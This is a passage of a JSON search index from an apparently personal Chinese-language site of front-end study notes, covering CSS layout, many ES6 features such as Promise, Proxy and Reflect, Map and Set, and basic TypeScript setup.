z-index: 1\">\n        所处的父层叠上下文是 div1 产生的层叠上下文\n    </div>\n\n    <div id=\"div3\">\n        <div id=\"div4\" style=\"position: relative; z-index: 2\">\n            所处的父层叠上下文也是 div1 产生的层叠上下文\n        </div>\n    </div>\n</div> 其他 记录一个现象, css生效不完全是按照定义的顺序来的,\n尤其当样式定义与多个文件, 浏览器可能由于网络原因、加载机制等, 效果与导入顺序不一致; 且实际在开发theia项目中, 发现, 限制条件更明确的, 可能优先级更高,\n比如 .cl1:hover 的优先级低于 .cl1:hover:not(:disabled):not(is-disabled) 暂时还没找到原因","tags":"前端","url":"/yq-docs-front-end-CSS-The-order-of-elements.html","loc":"/yq-docs-front-end-CSS-The-order-of-elements.html"},{"title":"宽度-高度百分比说明","text":"关于height这种设置的属性为百分比计算 一般情况下, 不为绝对定位时候是使用父元素的宽高计算的.\n更确切地说是 包含块 : 父元素的内容区（盒模型里的content） 实际生效的具体值的计算方式为: 元素的包含块大小 * 设定的百分比 注解 一般情况下, 不是绝对定位元素( position: absolute | fixed)、根元素 html 以及根字体, 元素的包含块就是父元素 什么是元素的包含块? 元素的包含块是指元素用来计算和定位的一个框; 对于开启绝对定位的元素来说，其包含块是离它最近的开启了定位（且position不为static）的祖先元素;\n如果所有的祖先元素都没有开启定位，则其包含块就是初始包含块; 一般情况下，根元素（在很多场景下可以看成<html>）被称为初始包含块，其尺寸等同于浏览器可视窗口的大小;\n对于其他元素，如果该元素的position是relative或者static，则包含块由其最近的块级祖先元素content box边界形成;\n如果元素的position为fixed，则包含块是初始包含块;\n如果元素position为absolute，则包含块由最近的position不为static的祖先元素建立; 有时候会发现设置的高度没有生效 原因是: 当一个元素的高度使用百分比值，\n如果其包含块没有明确的高度定义（也就是说，取决于内容高度），\n且这个元素不是绝对定位，则该百分比值等同于auto。auto是初始默认值，所以看起来就像是\"失效\"了。 此部分参考: https://zhuanlan.zhihu.com/p/394791528 示例","tags":"前端","url":"/yq-docs-front-end-CSS-Width-height-percentage-explanation.html","loc":"/yq-docs-front-end-CSS-Width-height-percentage-explanation.html"},{"title":"css常见使用技巧","text":"元素从左到右排列 这些从左到右的元素设置 display 为 flex 即可: .container {\n  display: flex;\n} 在这个基础上, 如果要再实现最后一个元素靠右, 那么可以: .item-right {\n    /* 会移动到最右边 */\n    margin-left: auto;\n} div结构: <div class=\"container\">\n  xxx1\n  <div class=\"item\">xxx2</div>\n  <div class=\"item-right\">xxx3</div>\n</div> 效果","tags":"前端","url":"/yq-docs-front-end-CSS-common-use-of-CSS.html","loc":"/yq-docs-front-end-CSS-common-use-of-CSS.html"},{"title":"ES6 数组","text":"数组创建 Array.of() 将参数中所有值作为元素形成数组 Array.from(arrayLike[, mapFn[, thisArg]]) 将类数组对象或可迭代对象转化为数组 arrayLike 想要转换的类数组对象或可迭代对象 mapFn 可选，map 函数，用于对每个元素进行处理，放入数组的是处理后的元素 thisArg 可选，用于指定 map 函数执行时的 this 对象 类数组对象 一个类数组对象必须含有 length 属性，且元素属性名必须是数值或者可转换为数值的字符 转换可迭代对象 转换 map: let map = new Map();\nmap.set('key0', 'value0');\nmap.set('key1', 'value1');\nconsole.log(Array.from(map)); // [['key0', 'value0'],['key1',\n// 'value1']] 转换 set: let arr = [1, 2, 3];\nlet set = new Set(arr);\nconsole.log(Array.from(set)); // [1, 2, 3] 转换字符串: let str = 'abc';\nconsole.log(Array.from(str)); // [\"a\", \"b\", \"c\"] 扩展的方法 查找 find() 查找数组中符合条件的元素,若有多个符合条件的元素，则返回第一个元素 findIndex() 查找数组中符合条件的元素索引，若有多个符合条件的元素，则返回第一个元素索引 参数1：回调函数\n参数2(可选)：指定回调函数中的 this 值 填充 fill() 将一定范围索引的数组元素内容填充为单个指定的值 参数1：用来填充的值\n参数2：被填充的起始索引\n参数3(可选)：被填充的结束索引，默认为数组末尾 copyWithin() 将一定范围索引的数组元素修改为此数组另一指定范围索引的元素 参数1：被修改的起始索引\n参数2：被用来覆盖的数据的起始索引\n参数3(可选)：被用来覆盖的数据的结束索引，默认为数组末尾 遍历 entries() 遍历键值对 keys() 遍历键名 values() 遍历键值 包含 includes() 数组是否包含指定值 注意：与 Set 和 Map 的 has 方法区分；\nSet 的 has 方法用于查找值；Map 的 has 方法用于查找键名。 嵌套数组转一维数组 flat() 待补充 flatMap() 先对数组中每个元素进行了的处理，再对数组执行 flat() 方法 参数1：遍历函数，该遍历函数可接受3个参数：当前元素、当前元素索引、原数组\n参数2：指定遍历函数中 this 的指向 splice(start: number, deleteCount?: number): T[]; 从指定索引删除指定数量的元素; 会对原数组进行修改, 返回一个由删除的元素组成的新数组 start: 数据索引下标 deleteCount: 从 start 开始, 需要删除的元素数量, 如果只是做替换, 为0 splice(start: number, deleteCount: number, ...items: T[]): T[]; 从指定索引删除指定数量的元素, 并在此位置增加给定的元素; 会对原数组进行修改, 返回一个由删除的元素组成的新数组 start: 数据索引下标 deleteCount: 从 start 开始, 需要删除的元素数量, 如果只是做替换, 为0 ...items: 需要增加的元素","tags":"前端","url":"/yq-docs-front-end-ES6-Array.html","loc":"/yq-docs-front-end-ES6-Array.html"},{"title":"async 函数","text":"async async 是 ES7 才有的与异步操作有关的关键字，和 Promise ， Generator 有很大关联的。 语法 async function name([param[, param[, ... param]]]) { statements } name 函数名称 param 要传递给函数的参数的名称 statements 函数体语句 返回值 async 函数返回一个 Promise 对象，可以使用 then 方法添加回调函数 await await 操作符用于等待一个 Promise 对象, 它只能在异步函数 async function 内部使用。 返回值 返回 Promise 对象的处理结果。如果等待的不是 Promise 对象，则返回该值本身。 await针对所跟不同表达式的处理方式： Promise 对象：await 会暂停执行，等待 Promise 对象 resolve，然后恢复 async 函数的执行并返回解析值。 非 Promise 对象：直接返回对应的值。","tags":"前端","url":"/yq-docs-front-end-ES6-Async-function.html","loc":"/yq-docs-front-end-ES6-Async-function.html"},{"title":"基本数据类型","text":"支持的数据类型: Number String Boolean Object null undefined Symbol (ES6新增); 每一个 Symbol 的值都是不相等的 有 Symbol.for() 的类似单例功能: let yellow = Symbol(\"Yellow\");\nlet yellow1 = Symbol.for(\"Yellow\");\nyellow === yellow1;      // false\n\nlet yellow2 = Symbol.for(\"Yellow\");\nyellow1 === yellow2;     // true 和 Symbol.keyFor() 检查是否已登记: let yellow1 = Symbol.for(\"Yellow\");\nSymbol.keyFor(yellow1);    // \"Yellow\"","tags":"前端","url":"/yq-docs-front-end-ES6-Basic-data-type.html","loc":"/yq-docs-front-end-ES6-Basic-data-type.html"},{"title":"ES6 Generator 函数","text":"ES6 新引入了 Generator 函数，可以通过 yield 关键字，把函数的执行流挂起，\n为改变执行流程提供了可能，从而为异步编程提供解决方案 Generator 函数组成 Generator 有两个区分于普通函数的部分: 一是在 function 后面，函数名之前有个 * 函数内部有 yield 表达式 其中 * 用来表示函数为 Generator 函数，yield 用来定义函数内部的状态: function* func(){\n  console.log(\"one\");\n  yield '1';\n  console.log(\"two\");\n  yield '2';\n  console.log(\"three\");\n  return '3';\n} 执行机制 调用 Generator 函数和调用普通函数一样，在函数名后面加上()即可，\n但是 Generator 函数不会像普通函数一样立即执行，而是返回一个指向内部状态对象的指针，\n所以要调用遍历器对象Iterator 的 next 方法，指针就会从函数头部或者上一次停下来的地方开始执行 函数返回的遍历器对象的方法 next 方法 一般情况下，next 方法不传入参数的时候，yield 表达式的返回值是 undefined .\n当 next 传入参数的时候，该参数会作为上一步yield的返回值。 yield* 表达式 yield* 表达式表示 yield 返回一个遍历器对象，用于在 Generator 函数内部，调用另一个 Generator 函数。","tags":"前端","url":"/yq-docs-front-end-ES6-Generator-function.html","loc":"/yq-docs-front-end-ES6-Generator-function.html"},{"title":"Map与Set","text":"Map 对象 Map 对象保存键值对。任何值(对象或者原始值) 都可以作为一个键或一个值 Maps 和 Objects 的区别 一个 Object 的键只能是字符串或者 Symbols，但一个 Map 的键可以是任意值 Map 中的键值是有序的（FIFO 原则），而添加到对象中的键则不是 Map 的键值对个数可以从 size 属性获取，而 Object 的键值对个数只能手动计算 Object 都有自己的原型，原型链上的键名有可能和你自己在对象上的设置的键名产生冲突 Map的迭代 方法一, 使用 for ... of ... : var myMap = new Map();\nmyMap.set(0, \"zero\");\nmyMap.set(1, \"one\");\n\n// 将会显示两个 log。 一个是 \"0 = zero\" 另一个是 \"1 = one\"\nfor (var [key, value] of myMap) {\n  console.log(key + \" = \" + value);\n}\nfor (var [key, value] of myMap.entries()) {\n  console.log(key + \" = \" + value);\n}\n/* 这个 entries 方法返回一个新的 Iterator 对象，它按插入顺序包含了 Map 对象中每个元素的 [key, value] 数组。 */ 方法二, 使用 forEach() : var myMap = new Map();\nmyMap.set(0, \"zero\");\nmyMap.set(1, \"one\");\n\n// 将会显示两个 logs。 一个是 \"0 = zero\" 另一个是 \"1 = one\"\nmyMap.forEach(function(value, key) {\n  console.log(key + \" = \" + value);\n}, myMap) Map 对象的操作 Map 与 Array的转换 Map 构造函数可以将一个二维键值对数组转换成一个 Map 对象: var kvArray = [[\"key1\", \"value1\"], [\"key2\", \"value2\"]];\nvar myMap = new Map(kvArray); 使用 Array.from 函数可以将一个 Map 对象转换成一个二维键值对数组: var outArray = Array.from(myMap);\nMap 的克隆\nvar myMap1 = new Map([[\"key1\", \"value1\"], [\"key2\", \"value2\"]]);\nvar myMap2 = new Map(myMap1);\n\nconsole.log(original === clone);\n// 打印 false。 Map 对象构造函数生成实例，迭代出新的对象。 Map 的合并 合并两个 Map 对象时，如果有重复的键值，则后面的会覆盖前面的，对应值即 uno，dos， three: var first = new Map([[1, 'one'], [2, 'two'], [3, 'three'],]);\nvar second = new Map([[1, 'uno'], [2, 'dos']]);\nvar merged = new Map([...first, ...second]); Set 对象 Set 对象允许你存储任何类型的唯一值，无论是原始值或者是对象引用 Set 中的特殊值 Set 对象存储的值总是唯一的，所以需要判断两个值是否恒等 有几个特殊值需要特殊对待： +0 与 -0 在存储判断唯一性的时候是恒等的，所以不重复； undefined 与 undefined 是恒等的，所以不重复； NaN 与 NaN 是不恒等的，但是在 Set 中只能存一个，不重复。 类型转换 Array Array 转 Set: var mySet = new Set([\"value1\", \"value2\", \"value3\"]); 用...操作符，将 Set 转 Array: var myArray = [...mySet]; String String 转 Set: var mySet = new Set('hello');  // Set(4) {\"h\", \"e\", \"l\", \"o\"}\n// 注：Set 中 toString 方法是不能将 Set 转换成 String 并集: var a = new Set([1, 2, 3]);\nvar b = new Set([4, 3, 2]);\nvar union = new Set([...a, ...b]); // {1, 2, 3, 4} 交集: var a = new Set([1, 2, 3]);\nvar b = new Set([4, 3, 2]);\nvar intersect = new Set([...a].filter(x => b.has(x))); // {2, 3} 差集: var a = new Set([1, 2, 3]);\nvar b = new Set([4, 3, 2]);\nvar difference = new Set([...a].filter(x => !b.has(x))); // {1}","tags":"前端","url":"/yq-docs-front-end-ES6-MAP-and-SET.html","loc":"/yq-docs-front-end-ES6-MAP-and-SET.html"},{"title":"ES6 模块","text":"ES6 引入了模块化，其设计思想是在编译时就能确定模块的依赖关系，以及输入和输出的变量。\nES6 的模块化分为导出（export） @与导入（import）两个模块。 ES6 的模块自动开启严格模式，不管你有没有在模块头部加上 use strict;。\n模块中可以导入和导出各种类型的变量，如函数，对象，字符串，数字，布尔值，类等。\n每个模块都有自己的上下文，每一个模块内声明的变量都是局部变量，不会污染全局作用域。\n每一个模块只加载一次（是单例的）， 若再去加载同目录下同文件，直接从内存中读取。 建议使用大括号指定所要输出的一组变量写在文档尾部，明确导出的接口。\n函数与类都需要有对应的名称，导出文档尾部也避免了无对应名称。","tags":"前端","url":"/yq-docs-front-end-ES6-Module.html","loc":"/yq-docs-front-end-ES6-Module.html"},{"title":"ES6 对象","text":"对象字面量 简洁表示法: const age = 12;\nconst name = \"Amy\";\nconst person = {age, name};\nperson   //{age: 12, name: \"Amy\"} 等同于: const person = {age: age, name: name} 属性名表达式 ES6允许用表达式作为属性名，但是一定要将表达式放在方括号内: const obj = {\n[\"he\"+\"llo\"](){\n  return \"Hi\";\n  }\n}\nobj.hello();  //\"Hi\" 注解 属性的简洁表示法和属性名表达式不能同时使用，否则会报错。 对象的拓展运算符 拓展运算符（...）用于取出参数对象所有可遍历属性然后拷贝到当前对象 基本用法: let person = {name: \"Amy\", age: 15};\nlet someone = { ...person };\nsomeone;  //{name: \"Amy\", age: 15} 可用于合并两个对象: let age = {age: 15};\nlet name = {name: \"Amy\"};\nlet person = {...age, ...name};\nperson;  //{age: 15, name: \"Amy\"} 注解 属性相同时, 后面的会覆盖掉前面的 对象的新方法 Object.assign(target, source_1, ···) 用于将源对象的所有可枚举属性复制到目标对象中 assign 的属性拷贝是浅拷贝 Object.is(value1, value2) 用来比较两个值是否严格相等，与（===）基本类似 与（===）的区别: //一是+0不等于-0\nObject.is(+0,-0);  //false\n+0 === -0  //true\n//二是NaN等于本身\nObject.is(NaN,NaN); //true\nNaN === NaN  //false","tags":"前端","url":"/yq-docs-front-end-ES6-Object.html","loc":"/yq-docs-front-end-ES6-Object.html"},{"title":"ES6 Promise 对象","text":"异步编程的一种解决方案。\n从语法上说，Promise 是一个对象，从它可以获取异步操作的消息 Promise 状态 状态的特点 Promise 异步操作有三种状态： pending（进行中） fulfilled（已成功） rejected（已失败） 除了异步操作的结果，任何其他操作都无法改变这个状态。 Promise 对象只有：从 pending 变为 fulfilled 和从 pending 变为 rejected 的状态改变。\n只要处于 fulfilled 和 rejected ，状态就不会再变了即 resolved（已定型）。 状态的缺点 无法取消 Promise ，一旦新建它就会立即执行，无法中途取消 如果不设置回调函数，Promise 内部抛出的错误，不会反应到外部 当处于 pending 状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成） then 方法 then 方法接收两个函数作为参数，\n第一个参数是 Promise 执行成功时的回调，\n第二个参数是 Promise 执行失败时的回调，两个函数只会有一个被调用 then 方法的特点 在 JavaScript 事件队列的当前运行完成之前，回调函数永远不会被调用: const p = new Promise(function(resolve,reject){\n  resolve('success');\n});\n\np.then(function(value){\n  console.log(value);\n});\n\nconsole.log('first');\n// first\n// success 通过 .then 形式添加的回调函数，不论什么时候，都会被调用。\n通过多次调用 .then，可以添加多个回调函数，它们会按照插入顺序并且独立运行。 then 方法将返回一个 resolved 或 rejected 状态的 Promise 对象用于链式调用，且 Promise 对象的值就是这个返回值。 then 方法注意点 简便的 Promise 链式编程最好保持扁平化，不要嵌套 Promise。\n注意总是返回或终止 Promise 链","tags":"前端","url":"/yq-docs-front-end-ES6-Promise-object.html","loc":"/yq-docs-front-end-ES6-Promise-object.html"},{"title":"Reflect 与 Proxy","text":"https://www.runoob.com/w3cnote/es6-reflect-proxy.html 即反射与代理 Proxy Proxy 可以对目标对象的读取、函数调用等操作进行拦截，然后进行操作处理.\n它不直接操作对象，而是像代理模式，通过对象的代理对象进行操作，在进行这些操作时，可以添加一些需要的额外操作。 用法: let proxy = new Proxy(target, handler) target: 需要代理的源对象 handler: 代理处理操作, 若为空即不做代理拦截处理 对象代理用例: let target = {\n    name: 'Tom',\n    age: 24\n}\nlet handler = {\n    get: function(target, key) {\n        console.log('getting '+key);\n        return target[key]; // 不是target.key\n    },\n    set: function(target, key, value) {\n        console.log('setting '+key);\n        target[key] = value;\n    }\n}\nlet proxy = new Proxy(target, handler)\nproxy.name     // 实际执行 handler.get\nproxy.age = 25 // 实际执行 handler.set\n// getting name\n// setting age\n// 25 实例方法 get(target, propKey, receiver) receiver 接收着, 一般表示代理对象, 比如上面的proxy set(target, propKey, value, receiver) 待补充 apply(target, ctx, args) 用于拦截函数的调用、call 和 reply 操作 target 目标对象 ctx 目标对象上下文 args 目标对象的参数数组 has(target, propKey) 用于拦截 HasProperty 操作，即在判断 target 对象是否存在 propKey 属性时，会被这个方法拦截.\n此方法不判断一个属性是对象自身的属性，还是继承的属性 construct(target, args) 用于拦截 new 命令。返回值必须为对象 deleteProperty(target, propKey) 用于拦截 delete 操作，如果这个方法抛出错误或者返回 false ，propKey 属性就无法被 delete 命令删除 defineProperty(target, propKey, propDesc) 用于拦截 Object.definePro若目标对象不可扩展，增加目标对象上不存在的属性会报错;\n若属性不可写或不可配置，则不能改变这些属性 其实就是拦截对象属性定义, 比如 ob.name=tom erty 操作 getOwnPropertyDescriptor(target, propKey) 用于拦截 Object.getOwnPropertyD() 返回值为属性描述对象或者 undefined 。 ptor 属性 getPrototypeOf(target) 主要用于拦截获取对象原型的操作。包括以下操作： Object.prototype._proto_ Object.prototype.isPrototypeOf() Object.getPrototypeOf() Reflect.getPrototypeOf() instanceof 注意，返回值必须是对象或者 null ，否则报错.\n另外，如果目标对象不可扩展（non-extensible），getPrototypeOf 方法必须返回目标对象的原型对象 isExtensible(target) 用于拦截 Object.isExtensible 操作。\n该方法只能返回布尔值，否则返回值会被自动转为布尔值。 ownKeys(target) 用于拦截对象自身属性的读取操作。主要包括以下操作: Object.getOwnPropertyNames() Object.getOwnPropertySymbols() Object.keys() or...in 方法返回的数组成员，只能是字符串或 Symbol 值，否则会报错。 若目标对象中含有不可配置的属性，则必须将这些属性在结果中返回，否则就会报错。 若目标对象不可扩展，则必须全部返回且只能返回目标对象包含的所有属性，不能包含不存在的属性，否则也会报错。 preventExtensions(target) 拦截 Object.preventExtensions 操作。\n该方法必须返回一个布尔值，否则会自动转为布尔值。 setPrototypeOf 主要用来拦截 Object.setPrototypeOf 方法。\n返回值必须为布尔值，否则会被自动转为布尔值。\n若目标对象不可扩展，setPrototypeOf 方法不得改变目标对象的原型。 Proxy.revocable() 用于返回一个可取消的 Proxy 实例。 Reflect Reflect 可以用于获取目标对象的行为，它与 Object 类似，但是更易读，为操作对象提供了一种更优雅的方式.\n它的方法与 Proxy 是对应的。 ES6 中将 Object 的一些明显属于语言内部的方法移植到了 Reflect 对象上（当前某些方法会同时存在于 Object 和 Reflect 对象上），\n未来的新方法会只部署在 Reflect 对象上。 Reflect 对象对某些方法的返回结果进行了修改，使其更合理。\nReflect 对象使用函数的方式实现了 Object 的命令式操作。 静态方法 Reflect.get(target, name, receiver) 查找并返回 target 对象的 name 属性。 Reflect.set(target, name, value, receiver)\n将 target 的 name 属性设置为 value。返回值为 boolean ，true 表示修改成功，false 表示失败。当 target 为不存在的对象时，会报错。 Reflect.has(obj, name) 是 name in obj 指令的函数化，用于查找 name 属性在 obj 对象中是否存在。返回值为 boolean。如果 obj 不是对象则会报错 TypeError。 Reflect.deleteProperty(obj, property) 是 delete obj[property] 的函数化，用于删除 obj 对象的 property 属性，返回值为 boolean。如果 obj 不是对象则会报错 TypeError。 Reflect.construct(obj, args) 等同于 new target(...args)。 Reflect.getPrototypeOf(obj) 用于读取 obj 的 _proto_ 属性。在 obj 不是对象时不会像 Object 一样把 obj 转为对象，而是会报错。 Reflect.setPrototypeOf(obj, newProto) 用于设置目标对象的 prototype。 Reflect.apply(func, thisArg, args) 等同于 Function.prototype.apply.call(func, thisArg, args) func 目标函数； thisArg 目标函数绑定的 this 对象； args 目标函数调用时传入的参数列表，可以是数组或类似数组的对象.\n若目标函数无法调用，会抛出 TypeError Reflect.defineProperty(target, propertyKey, attributes) 用于为目标对象定义属性。如果 target 不是对象，会抛出错误。 Reflect.getOwnPropertyDescriptor(target, propertyKey) 用于得到 target 对象的 propertyKey 属性的描述对象。在 target 不是对象时，会抛出错误表示参数非法，不会将非对象转换为对象。 Reflect.isExtensible(target) 用于判断 target 对象是否可扩展。返回值为 boolean 。如果 target 参数不是对象，会抛出错误 Reflect.preventExtensions(target) 用于让 target 对象变为不可扩展。如果 target 参数不是对象，会抛出错误 Reflect.ownKeys(target) 用于返回 target 对象的所有属性，等同于 Object.getOwnPropertyNames 与Object.getOwnPropertySymbols 之和","tags":"前端","url":"/yq-docs-front-end-ES6-Reflect-and-PROXY.html","loc":"/yq-docs-front-end-ES6-Reflect-and-PROXY.html"},{"title":"ES6 字符串操作","text":"子串的识别 ES6 之前判断字符串是否包含子串，用 indexOf 方法，ES6 新增了子串的识别方法 includes()：返回布尔值，判断是否找到参数字符串 startsWith()：返回布尔值，判断参数字符串是否在原字符串的头部 endsWith()：返回布尔值，判断参数字符串是否在原字符串的尾部 字符串重复 repeat(num) 若num不为整数, 向下取整 返回新的字符串，表示将字符串重复指定次数(num)返回 字符串补全 padStart：返回新的字符串，表示用参数字符串从头部（左侧）补全原字符串。\npadEnd：返回新的字符串，表示用参数字符串从尾部（右侧）补全原字符串。 模板字符串","tags":"前端","url":"/yq-docs-front-end-ES6-String-operation.html","loc":"/yq-docs-front-end-ES6-String-operation.html"},{"title":"数值","text":"常见数值表示 二进制表示法新写法: 前缀 0b 或 0B console.log(0b11 === 3); // true\nconsole.log(0B11 === 3); // true 八进制表示法新写法: 前缀 0o 或 0O console.log(0o11 === 9); // true\nconsole.log(0O11 === 9); // true 常量 Number.EPSILON Number.EPSILON 属性表示 1 与大于 1 的最小浮点数之间的差.\n它的值接近于 2.2204460492503130808472633361816E-16，或者 2-52. 测试数值是否在误差范围内: 0.1 + 0.2 === 0.3; // false\n// 在误差范围内即视为相等\nequal = (Math.abs(0.1 - 0.3 + 0.2) < Number.EPSILON); // true 属性特性: writable：false enumerable：false configurable：false 最大/最小安全整数 安全整数 安全整数表示在 JavaScript 中能够精确表示的整数，\n安全整数的范围在 2 的 -53 次方到 2 的 53 次方之间（不包括两个端点），\n超过这个范围的整数无法精确表示。 最大安全整数 安全整数范围的上限，即 2 的 53 次方减 1 .\n如: Number.MAX_SAFE_INTEGER + 1 === Number.MAX_SAFE_INTEGER + 2; // true\nNumber.MAX_SAFE_INTEGER === Number.MAX_SAFE_INTEGER + 1;     // false\nNumber.MAX_SAFE_INTEGER - 1 === Number.MAX_SAFE_INTEGER - 2; // false 最小安全整数 安全整数范围的下限，即 2 的 53 次方减 1 的负数.\n如: Number.MIN_SAFE_INTEGER + 1 === Number.MIN_SAFE_INTEGER + 2; // false\nNumber.MIN_SAFE_INTEGER === Number.MIN_SAFE_INTEGER - 1;     // false\nNumber.MIN_SAFE_INTEGER - 1 === Number.MIN_SAFE_INTEGER - 2; // true 属性特性: writable：false\nenumerable：false\nconfigurable：false 方法 Number 对象新方法 Number.isFinite() 用于检查一个数值是否为有限的（ finite ），即不是 Infinity Number.parseInt() 用于将给定字符串转化为指定进制的整数,\n如: // 不指定进制时默认为 10 进制\nNumber.parseInt('12.34'); // 12\nNumber.parseInt(12.34);   // 12\n\n// 指定进制\nNumber.parseInt('0011',2); // 3 Math 对象的扩展 ES6 在 Math 对象上新增了 17 个数学相关的静态方法，这些方法只能在 Math 中调用。 普通计算 Math.cbrt 用于计算一个数的立方根。 Math.imul 两个数以 32 位带符号整数形式相乘的结果，返回的也是一个 32 位的带符号整数 Math.hypot 用于计算所有参数的平方和的平方根 Math.clz32 用于返回数字的32 位无符号整数形式的前导0的个数 数字处理 Math.trunc 用于返回数字的整数部分 Math.fround 用于获取数字的32位单精度浮点数形式 判断 Math.sign 判断数字的符号（正、负、0） 对数方法 Math.expm1() 用于计算 e 的 x 次方减 1 的结果，即 Math.exp(x) - 1 Math.log1p(x) 用于计算1 + x 的自然对数，即 Math.log(1 + x) Math.log10(x) 用于计算以 10 为底的 x 的对数 Math.log2() 用于计算 2 为底的 x 的对数 双曲函数方法 Math.sinh(x): 用于计算双曲正弦 Math.cosh(x): 用于计算双曲余弦 Math.tanh(x): 用于计算双曲正切 Math.asinh(x): 用于计算反双曲正弦 Math.acosh(x): 用于计算反双曲余弦 Math.atanh(x): 用于计算反双曲正切 指数运算符 指数运算符: 1 ** 2; // 1\n// 右结合，从右至左计算\n2 ** 2 ** 3; // 256\n// **=\nlet exam = 2;\nexam ** = 2; // 4","tags":"前端","url":"/yq-docs-front-end-ES6-Value.html","loc":"/yq-docs-front-end-ES6-Value.html"},{"title":"变量声明/赋值","text":"普通赋值 let 声明的变量只在 let 命令所在的代码块内有效, 只能声明一次 var 在全局范围内有效, 可多次声明 const 声明一个只读的常量，一旦声明，常量的值就不能改变, 一旦声明必须初始化.\nconst 其实保证的不是变量的值不变，而是保证变量指向的内存地址所保存的数据不允许改动. 对于简单类型（数值 number、字符串 string 、布尔值 boolean）,值就保存在变量指向的那个内存地址，\n因此 const 声明的简单类型变量等同于常量. 而复杂类型（对象 object，数组 array，函数 function），变量指向的内存地址其实是保存了一个指向实际数据的指针,\n所以 const 只能保证指针是固定的，至于指针指向的数据结构变不变就无法控制了，所以使用 const 声明复杂类型对象时要慎重。 解构赋值 解构赋值是对赋值运算符的扩展。\n他是一种针对数组或者对象进行模式匹配，然后对其中的变量进行赋值 有两部分组成: 解构的源，解构赋值表达式的右边部分; 解构的目标，解构赋值表达式的左边部分. 如: let [a, , b] = [1, 2, 3];\n// a = 1\n// b = 3\n\nlet [a, ...b] = [1, 2, 3];\n//a = 1\n//b = [2, 3] 在数组的解构中，解构的目标若为可遍历对象，皆可进行解构赋值。可遍历对象即实现 Iterator 接口的数据: let [a, b, c, d, e] = 'hello';\n// a = 'h'\n// b = 'e'\n// c = 'l'\n// d = 'l'\n// e = 'o' 带默认值的情况: let [a = 3, b = a] = [];     // a = 3, b = 3\nlet [a = 3, b = a] = [1];    // a = 1, b = 1\nlet [a = 3, b = a] = [1, 2]; // a = 1, b = 2","tags":"前端","url":"/yq-docs-front-end-ES6-Variable-statement.html","loc":"/yq-docs-front-end-ES6-Variable-statement.html"},{"title":"ES6 函数","text":"函数参数的扩展 不定参数用来表示不确定参数个数，形如，...变量名，\n由...加上一个具名参数标识符组成。具名参数只能放在参数组的最后，并且有且只有一个不定参数。 基本用法: function f(...values){\n    console.log(values.length);\n}\nf(1,2);      //2\nf(1,2,3,4);  //4 箭头函数 箭头函数提供了一种更加简洁的函数书写方式。基本语法是: 参数 => 函数体 当箭头函数没有参数或者有多个参数，要用 () 括起来;\n当箭头函数函数体有多行语句，用 {} 包裹起来，表示代码块 当箭头函数要返回对象的时候，为了区分于代码块，要用 () 将对象包裹起来: var f = (id,name) => ({id: id, name: name});\nf(6,2);  // {id: 6, name: 2} 注解 没有 this、super、arguments 和 new.target 绑定: var func = () => {\n  // 箭头函数里面没有 this 对象，\n  // 此时的 this 是外层的 this 对象，即 Window\n  console.log(this)\n}\nfunc(55)  // Window 箭头函数体中的 this 对象，是定义函数时的对象，而不是使用函数时的对象: function fn(){\n  setTimeout(()=>{\n    // 定义时，this 绑定的是 fn 中的 this 对象\n    console.log(this.a);\n  },0)\n}\nvar a = 20;\n// fn 的 this 对象为 {a: 18}\nfn.call({a: 18});  // 18 不可以作为构造函数，也就是不能使用 new 命令，否则会报错","tags":"前端","url":"/yq-docs-front-end-ES6-function.html","loc":"/yq-docs-front-end-ES6-function.html"},{"title":"ES6 类","text":"在ES6中，class (类)作为对象的模板被引入，可以通过 class 关键字定义类。\nclass 的本质是 function。\n它可以看作一个语法糖，让对象原型的写法更加清晰、更像面向对象编程的语法。","tags":"前端","url":"/yq-docs-front-end-ES6-kind.html","loc":"/yq-docs-front-end-ES6-kind.html"},{"title":"Promise","text":"为什么要使用 Promise 传统的异步请求如果存在多次处理, 那么结果就会是嵌套调用: const read_model = require('model');\nconst _file = './name.txt'\n\nread_model.readFile(_file,'utf8',function(err,data){\n    read_model.readFile(data, 'utf8',function(err,data){\n        read_model.readFile(data,'utf8',function(err,data){\n            console.log(data);\n        });\n    });\n}); 使用 Promise 可以将其更改为链式调用: function read(filename) {\n    return new Promise((resolve, reject) => {\n        read_model.read_model(filename, 'utf-8', (err, data) => {\n            if (err) {reject(err);}\n            resolve(data);\n        });\n    });\n}\n\nread(_file).then((data) => {\n    return read(data);\n}).then((data) => {\n    return read(data);\n}).then((data) => {\n    console.log(data);\n}, err => {\n    console.log(err);\n    }\n); 显著解决了异步编码风格问题, 嵌套调用的可读性维护性较差. 业界比较著名的实现 Promise 的类库有 bluebird、Q、ES6-Promise。 构造说明 构造说明: new Promise((resolve, reject) => {}) resolve 调用成功后执行, 如果是函数 resolve(success_data). 使用 value 保存成功状态的值. reject  调用失败后执行, 如果是函数 reject(err_msg). 使用 reason 保存失败状态的值. Promise 的状态不可逆，同时调用 resolve 函数和 reject 函数，默认会采取第一次调用的结果。\npromise 有三个状态：pending，fulfilled，or rejected. 默认状态是 pending;\n只能从pending到rejected, 或者从pending到fulfilled，状态一旦确认，就不会再改变; 调用 Promise , 会返回一个 Promise 对象 promise 必须有一个then方法，then 接收两个参数，分别是 promise 成功的回调 onFulfilled,\n和 promise 失败的回调 onRejected.\n也可称为 thenable 如果调用 then 时，promise 已经成功，则执行onFulfilled，参数是promise的value； 如果调用 then 时，promise 已经失败，那么执行onRejected, 参数是promise的reason； 如果 then 中抛出了异常，那么就会把这个异常作为参数，传递给下一个 then 的失败的回调onRejected； 注解 (resolve, reject) => {} 被称为 executor 函数 自定义 Promise , 实现需参考: Promises/A+规范 : 补充 Promise 表示一个异步操作的最终结果，与之进行交互的方式主要是 then 方法， 该方法注册了两个回调函数，用于接收 promise 的终值或本 promise 不能执行的原因。","tags":"前端","url":"/yq-docs-front-end-ES6-promise.html","loc":"/yq-docs-front-end-ES6-promise.html"},{"title":"基础语法","text":"TypeScript 程序由以下几个部分组成: 模块 函数 变量 语句和表达式 注释 代码的运行, 如有一个 eg.ts , 需要先转换为 js 代码: tsc eg.ts 注解 tsc通过node的npm安装: npm install typescript -g 然后就是普通的 js 那样执行: node eg.js 一些特点 区分大小写 空格制表符不敏感 分号可选 注释 // 或者 /* */","tags":"前端","url":"/yq-docs-front-end-TypeScript-Basic-grammar.html","loc":"/yq-docs-front-end-TypeScript-Basic-grammar.html"},{"title":"TypeScript基础类型","text":"any: 任意类型 number: 数字类型, 双精度 64 位浮点值。它可以用来表示整数和分数 string: 字符串, 可使用 单/双/反引号定义, 其中反引号可用于定义多行文本以及使用变量(用$), 类似于Python的 f boolean: true, false 